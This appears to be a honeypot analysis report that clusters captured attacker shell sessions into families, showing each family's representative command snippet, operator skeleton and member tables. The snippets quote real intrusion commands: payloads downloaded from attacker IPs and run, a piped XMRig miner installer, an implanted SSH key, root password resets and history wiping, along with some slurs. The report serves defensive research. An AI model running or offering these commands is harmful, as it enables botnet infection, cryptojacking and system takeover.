`[('start', ';'), ('enable', ';'), ('config', ';'), ('system', ';'), ('linuxshell', ';'), ('su', ';'), ('shell', ';'), ('sh', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('rm', ';'), ('wget', ';'), ('curl', ';'), ('busybox', ';'), ('busybox', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('tftp', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('tftp', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('ftpget', ';'), ('PH_EXEC_1', ';'), ('echo', 'EOS')]`

Top operators: [('cd', 5), ('PH_EXEC_1', 4), ('chmod', 3), ('busybox', 2), ('tftp', 2), ('start', 1), ('enable', 1), ('config', 1), ('system', 1), ('linuxshell', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| cc753cd1f1e98901 | 018989405a03 |       25 |              16 |

---

## Family 27

- **Total Session Volume**: 15
- **FI-Unique Archetypes**: 4
- **Mean FS**: 0.852 (±0.086)
- **Medoid Archetype**: `ad0d74e3f01472d0` (Session: `c3310952d9f2`, n_rows=109)

**Medoid Execution Snippet:**
```text
enable
system
shell
sh
/bin/busybox mkdir /tmp/
>/tmp/.file && cd /tmp/
/bin/busybox rm -rf .file .rekobot .vomitfest
/bin/busybox mkdir /var/
>/var/.file && cd /var/
/bin/busybox rm -rf .file .rekobot .vomitfest
/bin/busybox mkdir /dev/
>/dev/.file && cd /dev/
/bin/busybox rm -rf .file .rekobot .vo ...
```

**Consensus Skeleton (op, conn pairs):**
`[('enable', ';'), ('system', ';'), ('shell', ';'), ('sh', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('>', ';'), ('>', ';'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('PH_EXEC_1', ';'), ('PH_EXEC_2', ';'), ('>', ';'), ('>', 'EOS')]`

Top operators: [('busybox', 648), ('>', 72), ('cd', 56), ('enable', 4), ('system', 4), ('shell', 4), ('sh', 4), ('PH_EXEC_1', 4), ('PH_EXEC_2', 4)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| cc804a17c800b42d | 0119a7d0146f |      109 |              11 |
| 5cff72dd65bbf6ff | 30a04b063f4c |      136 |               2 |
| ad0d74e3f01472d0 | c3310952d9f2 |      109 |               1 |
| bfd16567caf829f2 | b6b361c8c381 |      128 |               1 |

---

## Family 22

- **Total Session Volume**: 14
- **FI-Unique Archetypes**: 6
- **Mean FS**: 0.842 (±0.075)
- **Medoid Archetype**: `ec4839a164656450` (Session: `ed3c7408cc68`, n_rows=13)

**Medoid Execution Snippet:**
```text
ifconfig
cd /tmp
wget http://46.249.32.109/Telnet.sh
curl -O http://46.249.32.109/Telnet.sh
chmod 777 Telnet.sh
sh Telnet.sh
tftp 46.249.32.109 -c get Telnet1.sh
chmod 777 Telnet1.sh
sh Telnet1.sh
tftp -r Telnet2.sh -g 46.249.32.109
chmod 777 Telnet2.sh
sh Telnet2.sh
rm -rf Telnet.sh Telnet1.sh Teln ...
```

**Consensus Skeleton (op, conn pairs):**
`[('wget', ';'), ('curl', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';')]`

Top operators: [('sh', 19), ('chmod', 18), ('tftp', 12), ('wget', 6), ('curl', 6), ('rm', 6), ('cd', 6), ('busybox', 2), ('echo', 2), ('ifconfig', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| ce7d3782a9da77e4 | 391a71317748 |       12 |               5 |
| fa24a1d05d20a854 | 3d2c59a2d431 |       13 |               5 |
| 653e4e58e5ea6515 | decc035139a7 |       13 |               1 |
| 79e235c888f07e05 | 91b1616d4792 |       14 |               1 |
| 878d791acc0e770b | a7c6af1be4ba |       14 |               1 |
| ec4839a164656450 | ed3c7408cc68 |       13 |               1 |

---

## Family 168

- **Total Session Volume**: 13
- **FI-Unique Archetypes**: 13
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `02327852a453b13f` (Session: `fdf594868b36`, n_rows=3)

**Medoid Execution Snippet:**
```text
sudo hive-passwd cummingonthecumrightinfrontofthecumwhichiscummingonthecummyfloor
sudo pkill Xorg
sudo pkill x11vnc ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sudo', ';'), ('sudo', ';'), ('sudo', 'EOS')]`

Top operators: [('sudo', 39)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 02327852a453b13f | fdf594868b36 |        3 |               1 |
| 16d9077d1e3293c9 | c4871092322f |        3 |               1 |
| 1999a28288212d4b | 3145093f7f50 |        3 |               1 |
| 317ace6a8a929b29 | 5d342e1fe448 |        3 |               1 |
| 35400ead1ac6ac9b | 70dafb18f647 |        3 |               1 |
| 45537606d1524908 | 21d2456ba73f |        3 |               1 |
| 58dd07fc158c6ccf | bd6e1f2ba232 |        3 |               1 |
| 5c6bc0b3230cb890 | 26ed276e9395 |        3 |               1 |
| 75d7e196dc134d49 | a2a4efcba856 |        3 |               1 |
| 90c52ddc78fa06f9 | a4375087cf88 |        3 |               1 |

---

## Family 148

- **Total Session Volume**: 13
- **FI-Unique Archetypes**: 13
- **Mean FS**: 0.913 (±0.058)
- **Medoid Archetype**: `2dd8c574d56027d3` (Session: `c1b64884ea67`, n_rows=4)

**Medoid Execution Snippet:**
```text
sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdvbase64
sudo pkill Xorg
sudo pkill x11vnc
cat /hive-config/rig.conf ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sudo', ';'), ('sudo', ';'), ('sudo', ';')]`

Top operators: [('sudo', 42), ('cat', 6), ('uname', 4)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 2dd8c574d56027d3 | c1b64884ea67 |        4 |               1 |
| 33f625d3681f74e9 | c634118da562 |        4 |               1 |
| 3f9d3df88bcfa820 | fb6dfe09c176 |        4 |               1 |
| 4ab3767f04d2a00c | 937038e9f77a |        4 |               1 |
| 6ef24ee06187c9a9 | 5bda475f7e5f |        4 |               1 |
| 864908634eb3a11a | 42e09f976098 |        4 |               1 |
| 8a73194ae38b6044 | 2781b0dee8c1 |        4 |               1 |
| 95fe2b534c2a97d4 | af2cfc214b8a |        4 |               1 |
| aacb968c6ba044c5 | e28553b30078 |        4 |               1 |
| bdde9fc738e1c506 | c4278892c654 |        4 |               1 |

---

## Family 10

- **Total Session Volume**: 12
- **FI-Unique Archetypes**: 11
- **Mean FS**: 0.834 (±0.099)
- **Medoid Archetype**: `15c5aa567680fe3f` (Session: `2a64a64baebd`, n_rows=4)

**Medoid Execution Snippet:**
```text
cd /tmp/
wget http://45.133.9.188/x86_64
chmod 777 *
./x86_64 myroots ;
```

**Consensus Skeleton (op, conn pairs):**
`[('wget', ';'), ('chmod', ';'), ('PH_EXEC_1', 'EOS')]`

Top operators: [('wget', 11), ('chmod', 11), ('PH_EXEC_1', 11), ('cd', 8), ('curl', 3), ('rm', 3), ('cat', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 15c5aa567680fe3f | 2a64a64baebd |        4 |               2 |
| 17da5004e3814c2c | f95f850b2023 |        4 |               1 |
| 2db484e0a936e54c | 589b628d3bb6 |        4 |               1 |
| 478abf41d616908e | 28cf4cc72480 |        5 |               1 |
| 55d3fd3767ef1440 | 37118af3e506 |        5 |               1 |
| 5ebe8cfb1aaf5d46 | 771664c12774 |        3 |               1 |
| 6822e92a8fe4105c | 4bacd95939b5 |        4 |               1 |
| 763e124e45ea9ea0 | f46dfbe723d7 |        4 |               1 |
| 8b74dd14fdf07edb | e4d921c1793a |        5 |               1 |
| afcc803533ef5fe8 | c874759cde04 |        4 |               1 |

---

## Family 46

- **Total Session Volume**: 12
- **FI-Unique Archetypes**: 5
- **Mean FS**: 0.825 (±0.079)
- **Medoid Archetype**: `c79dc606fc4f7316` (Session: `1b5f4a64871a`, n_rows=6)

**Medoid Execution Snippet:**
```text
cat /etc/issue
cd /tmp/
wget http://179.43.175.83/x86_64
chmod 777 x86_64
./x86_64 x86xhed
history -c ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', ';'), ('cd', ';'), ('wget', ';'), ('chmod', ';')]`

Top operators: [('cat', 5), ('cd', 5), ('wget', 5), ('chmod', 5), ('PH_EXEC_1', 3), ('sh', 2), ('curl', 1), ('rm', 1), ('history', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 636919db89f45da1 | 1ee63ab3c121 |        6 |               8 |
| 30469dd0972f7a32 | 66ddfab878af |        5 |               1 |
| 3b17817da47c0ac7 | d2e433bb1974 |        6 |               1 |
| 91cb4c13056a4fff | 515badc6bb27 |        5 |               1 |
| c79dc606fc4f7316 | 1b5f4a64871a |        6 |               1 |

---

## Family 28

- **Total Session Volume**: 11
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.818 (±0.000)
- **Medoid Archetype**: `4f5f4a4389ebced8` (Session: `01b95334098f`, n_rows=6)

**Medoid Execution Snippet:**
```text
cat /proc/cpuinfo | grep name | wc -l
echo -e "2222\nt1j5UfW02HlS\nt1j5UfW02HlS" | passwd | bash
Enter new UNIX password:
echo "2222\nt1j5UfW02HlS\nt1j5UfW02HlS\n" | passwd
echo "321" > /var/tmp/.var03522123
rm -rf /var/tmp/.var03522123 ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('passwd', '|'), ('bash', ';'), ('Enter', ';'), ('echo', '|')]`

Top operators: [('echo', 5), ('passwd', 4), ('cat', 2), ('grep', 2), ('wc', 2), ('bash', 2), ('Enter', 2), ('rm', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| c1fe552010953838 | 37b05e610a81 |        4 |              10 |
| 4f5f4a4389ebced8 | 01b95334098f |        6 |               1 |

---

## Family 226

- **Total Session Volume**: 11
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `05292031249df32d` (Session: `15fc0f61ae98`, n_rows=12)

**Medoid Execution Snippet:**
```text
enable
system
shell
sh
cat /proc/mounts
/bin/busybox XXYFY
cd /dev/shm
cat .s || cp /bin/echo .s
/bin/busybox XXYFY
tftp
wget
/bin/busybox XXYFY ;
```

**Consensus Skeleton (op, conn pairs):**
`[('enable', ';'), ('system', ';'), ('shell', ';'), ('sh', ';'), ('cat', ';'), ('busybox', ';'), ('cd', ';'), ('cat', '||'), ('cp', ';'), ('busybox', ';'), ('tftp', ';'), ('wget', ';'), ('busybox', 'EOS')]`

Top operators: [('busybox', 3), ('cat', 2), ('enable', 1), ('system', 1), ('shell', 1), ('sh', 1), ('cd', 1), ('cp', 1), ('tftp', 1), ('wget', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 05292031249df32d | 15fc0f61ae98 |       12 |              11 |

---

## Family 295

- **Total Session Volume**: 10
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `1f56df1fa3bf1b7a` (Session: `0bc1947dc84b`, n_rows=1)

**Medoid Execution Snippet:**
```text
curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA ;
```

**Consensus Skeleton (op, conn pairs):**
`[('curl', '|'), ('bash', 'EOS')]`

Top operators: [('curl', 1), ('bash', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 1f56df1fa3bf1b7a | 0bc1947dc84b |        1 |              10 |

---

## Family 245

- **Total Session Volume**: 10
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `a34d629a02c11268` (Session: `209453f506ab`, n_rows=1)

**Medoid Execution Snippet:**
```text
cat /etc/issue ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', 'EOS')]`

Top operators: [('cat', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| a34d629a02c11268 | 209453f506ab |        1 |              10 |

---

## Family 120

- **Total Session Volume**: 9
- **FI-Unique Archetypes**: 4
- **Mean FS**: 0.885 (±0.063)
- **Medoid Archetype**: `0a2c3b8f00ad2ee1` (Session: `89821976a466`, n_rows=9)

**Medoid Execution Snippet:**
```text
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPg ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('chpasswd', '|'), ('bash', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('free', '|'), ('grep', '|')]`

Top operators: [('grep', 12), ('cd', 8), ('echo', 8), ('cat', 8), ('awk', 8), ('rm', 4), ('mkdir', 4), ('chmod', 4), ('wc', 4), ('chpasswd', 4)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| fc5dfb79e8731b2e | 1de9aeba07c4 |        8 |               4 |
| 0a2c3b8f00ad2ee1 | 89821976a466 |        9 |               3 |
| 581947311e8c323b | d67d458aa671 |        5 |               1 |
| 5fd3c4481302e91d | 5ba2e134b752 |       10 |               1 |

---

## Family 38

- **Total Session Volume**: 8
- **FI-Unique Archetypes**: 8
- **Mean FS**: 0.845 (±0.085)
- **Medoid Archetype**: `3cf68f3dd72b5853` (Session: `7b08fdcd62b1`, n_rows=5)

**Medoid Execution Snippet:**
```text
cd /tmp
wget http://193.42.33.81/Fourloko.sh
chmod +x Fourloko.sh
sh Fourloko.sh
rm -rf * ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('chmod', ';'), ('rm', 'EOS')]`

Top operators: [('cd', 8), ('chmod', 8), ('rm', 8), ('wget', 7), ('sh', 6), ('curl', 3), ('busybox', 1), ('PH_EXEC_2', 1), ('PH_EXEC_1', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 08ecafd55fcfa566 | d327773432e4 |        6 |               1 |
| 159ec8c749fe8f55 | d9cec05baa83 |        6 |               1 |
| 30b8f1ed61648a7c | 2c2a9946d081 |        6 |               1 |
| 353de966c63bb73a | ad97084f7da8 |        4 |               1 |
| 3cf68f3dd72b5853 | 7b08fdcd62b1 |        5 |               1 |
| 5a06ef93c2e72551 | aa0e55365c6e |        5 |               1 |
| 8fadb5d2531aa0d0 | 6e216449a6a3 |        5 |               1 |
| b1ce3dd5fd3b2cf3 | 562aae11507c |        5 |               1 |

---

## Family 69

- **Total Session Volume**: 8
- **FI-Unique Archetypes**: 7
- **Mean FS**: 0.891 (±0.065)
- **Medoid Archetype**: `23e0e33ee2365c00` (Session: `fc7cc2070b49`, n_rows=7)

**Medoid Execution Snippet:**
```text
cd /tmp
rm -rf 351*
wget http://45.67.230.216/351.sh
curl -O http://45.67.230.216/351.sh
chmod 777 351.sh
./351.sh server
sh 351.sh server ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('rm', ';'), ('wget', ';'), ('curl', ';'), ('chmod', ';')]`

Top operators: [('rm', 9), ('cd', 7), ('wget', 7), ('curl', 7), ('chmod', 7), ('sh', 6), ('PH_EXEC_1', 5), ('PH_EXEC_2', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 0340b77655fb77e6 | 01cd14cb66a4 |        6 |               2 |
| 23e0e33ee2365c00 | fc7cc2070b49 |        7 |               1 |
| 8af81c160202d6b7 | b8504b91b19a |        7 |               1 |
| de688bb2d79b4239 | 55ec183542a7 |        7 |               1 |
| e0eab7dbef505ede | 294c4a3b2663 |        7 |               1 |
| e1b0c0bde65fcbfa | 22dbd7533489 |        7 |               1 |
| e70c5b2c26a9284a | 62bbf02f706f |        8 |               1 |

---

## Family 108

- **Total Session Volume**: 8
- **FI-Unique Archetypes**: 6
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `1bcf3e67a571ba48` (Session: `5e9d638e23e4`, n_rows=1)

**Medoid Execution Snippet:**
```text
echo 'hubnr_was_here' ;
```

**Consensus Skeleton (op, conn pairs):**
`[('echo', 'EOS')]`

Top operators: [('echo', 6)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| a5b2e002ac0fcb8a | bc9a56ff4d6b |        1 |               2 |
| cf4a2920b1917dc7 | 98d230050682 |        1 |               2 |
| 1bcf3e67a571ba48 | 5e9d638e23e4 |        1 |               1 |
| 68f6c6f806255ef3 | 897280cf1bbc |        1 |               1 |
| c174d59494746fd6 | 2a51213c07ea |        1 |               1 |
| e703dc5002247b15 | 9b9280f7429b |        1 |               1 |

---

## Family 43

- **Total Session Volume**: 8
- **FI-Unique Archetypes**: 4
- **Mean FS**: 0.823 (±0.062)
- **Medoid Archetype**: `cfa9c3232e22b08c` (Session: `e7fd9c74b94e`, n_rows=6)

**Medoid Execution Snippet:**
```text
enable
system
shell
sh
linuxshell
/bin/busybox TSUNAMI ;
```

**Consensus Skeleton (op, conn pairs):**
`[('enable', ';'), ('system', ';'), ('shell', ';'), ('sh', ';')]`

Top operators: [('enable', 4), ('system', 4), ('shell', 4), ('sh', 4), ('busybox', 4), ('linuxshell', 2), ('cat', 1), ('ls', 1), ('echo', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 332f033b6b132ad9 | 30ea7568ed51 |        6 |               5 |
| 7b462437d6e2d04d | 41469523ddf0 |        7 |               1 |
| 80f26f4f9214fd99 | c9cfd4049504 |        6 |               1 |
| cfa9c3232e22b08c | e7fd9c74b94e |        6 |               1 |

---

## Family 109

- **Total Session Volume**: 8
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.800 (±0.000)
- **Medoid Archetype**: `d753789416de82c1` (Session: `76bf9cdb6e05`, n_rows=3)

**Medoid Execution Snippet:**
```text
uname -a
lspci | grep -i --color 'vga\ | 3d\ | 2d';curl -s -L http://39.165.53.17:8088/iposzz/dred -o /tmp/dred
perl /tmp/dred ;
```

**Consensus Skeleton (op, conn pairs):**
`[('uname', ';'), ('lspci', '|'), ('grep', ';')]`

Top operators: [('uname', 2), ('lspci', 2), ('grep', 2), ('curl', 2), ('perl', 1), ('bash', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| da697d01d317fca6 | 173dbeed8299 |        2 |               6 |
| d753789416de82c1 | 76bf9cdb6e05 |        3 |               2 |

---

## Family 103

- **Total Session Volume**: 7
- **FI-Unique Archetypes**: 7
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `0dab4ca7b41e6034` (Session: `a47b0bf2733a`, n_rows=1)

**Medoid Execution Snippet:**
```text
/bin/busybox HOifA8Oj ;
```

**Consensus Skeleton (op, conn pairs):**
`[('busybox', 'EOS')]`

Top operators: [('busybox', 7)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 0dab4ca7b41e6034 | a47b0bf2733a |        1 |               1 |
| 267bd35fdf1f5366 | c55a4ae17a93 |        1 |               1 |
| 399c71a434d6df4c | 70ff6320b34f |        1 |               1 |
| 481262dd010b582b | 8a147e425ba9 |        1 |               1 |
| cf17fb545d420f48 | 41225921aeb9 |        1 |               1 |
| efe58e0d39733ab8 | 2118bab0cf51 |        1 |               1 |
| fc9b41147813251c | 661855beebb5 |        1 |               1 |

---

## Family 220

- **Total Session Volume**: 7
- **FI-Unique Archetypes**: 7
- **Mean FS**: 0.964 (±0.057)
- **Medoid Archetype**: `0f04e609dd8c80ea` (Session: `4ccef3cf80aa`, n_rows=7)

**Medoid Execution Snippet:**
```text
sudo hive-passwd why_s0_g4y_n1gger_wh4t_4re_You_L00king_@t
pkill Xorg
pkill x11vnc
pkill Hello
systemctl stop shellinabox
history -c
cat /hive-config/rig.conf ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sudo', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('systemctl', ';'), ('history', ';')]`

Top operators: [('kill', 21), ('sudo', 7), ('systemctl', 7), ('history', 7), ('cat', 7), ('uname', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 0f04e609dd8c80ea | 4ccef3cf80aa |        7 |               1 |
| 27fe36edabb6dc85 | 179d697f03a7 |        7 |               1 |
| 3196b69f269c161d | 507980065ee0 |        7 |               1 |
| 4ebac6077469cd69 | ddbc33c2e90b |        8 |               1 |
| 66fbfa24a228233f | f6bb02bff0ce |        7 |               1 |
| 6ee34c13e67f7a0c | bcb0a39cddda |        7 |               1 |
| 9769b179207e2304 | 9fcc130bf207 |        7 |               1 |

---

## Family 1

- **Total Session Volume**: 7
- **FI-Unique Archetypes**: 6
- **Mean FS**: 0.782 (±0.065)
- **Medoid Archetype**: `4af3ea5df6d3feae` (Session: `bc0155338d64`, n_rows=23)

**Medoid Execution Snippet:**
```text
enable
system
shell
sh
echo -e '\x41\x4b\x34\x37'enable
system
shell
sh
echo -e '\x41\x4b\x34\x37'enable
system
shell
sh
echo -e '\x41\x4b\x34\x37'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
wget http://209.141.51.132/telnetsc.sh
busybox wget http://209.141.51.132/telnetsc.sh
tftp -r telne ...
```

**Consensus Skeleton (op, conn pairs):**
`[('enable', ';'), ('system', ';'), ('shell', ';'), ('sh', ';'), ('echo', ';'), ('system', ';'), ('shell', ';'), ('sh', ';'), ('echo', ';'), ('system', ';'), ('shell', ';'), ('sh', ';'), ('echo', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('chmod', ';'), ('sh', ';')]`

Top operators: [('sh', 31), ('cd', 22), ('system', 19), ('shell', 19), ('echo', 19), ('chmod', 11), ('busybox', 10), ('rm', 8), ('tftp', 7), ('enable', 6)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| a98b0e60df6880d8 | 0c0795926e8f |       27 |               2 |
| 0da89b7ca41273d1 | a29dc8f9eacf |       19 |               1 |
| 3da825aea64e64cf | b132f4bc593d |       24 |               1 |
| 404b38bc728bcb5e | b089cef31eab |       27 |               1 |
| 4af3ea5df6d3feae | bc0155338d64 |       23 |               1 |
| a9c2da4102d4a334 | 9bc9129e9509 |       21 |               1 |

---

## Family 144

- **Total Session Volume**: 7
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `9230ed4adbbac672` (Session: `0e0318d974f1`, n_rows=3)

**Medoid Execution Snippet:**
```text
cat /proc/cpuinfo | grep name | wc -l
echo "root:Ilc7LStzDJvX" | chpasswd | bash
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}' ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('chpasswd', '|'), ('bash', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', 'EOS')]`

Top operators: [('cat', 2), ('grep', 2), ('wc', 1), ('echo', 1), ('chpasswd', 1), ('bash', 1), ('head', 1), ('awk', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 9230ed4adbbac672 | 0e0318d974f1 |        3 |               7 |

---

## Family 185

- **Total Session Volume**: 6
- **FI-Unique Archetypes**: 6
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `146bfbf4066fd438` (Session: `0034d3930ec3`, n_rows=1)

**Medoid Execution Snippet:**
```text
uname -a ;
```

**Consensus Skeleton (op, conn pairs):**
`[('uname', 'EOS')]`

Top operators: [('uname', 6)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 146bfbf4066fd438 | 0034d3930ec3 |        1 |               1 |
| 3f8082dd559b373e | 493c48811984 |        1 |               1 |
| 815a03349933d8a5 | 5c5cc623e880 |        1 |               1 |
| a16b7c976b9a1fd9 | 3da6c5b4ddec |        1 |               1 |
| c1f4de5103d6ebc1 | 3da272d325b4 |        1 |               1 |
| ca7599047742b99a | 90c77ee4f37f |        1 |               1 |

---

## Family 80

- **Total Session Volume**: 6
- **FI-Unique Archetypes**: 6
- **Mean FS**: 0.912 (±0.040)
- **Medoid Archetype**: `32777bc4e28224a2` (Session: `48ac65564ea0`, n_rows=8)

**Medoid Execution Snippet:**
```text
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
wget http://103.76.181.17/AkitaXss/bin.x86
curl -O http://178.128.96.224/AkitaXss/bin.x86
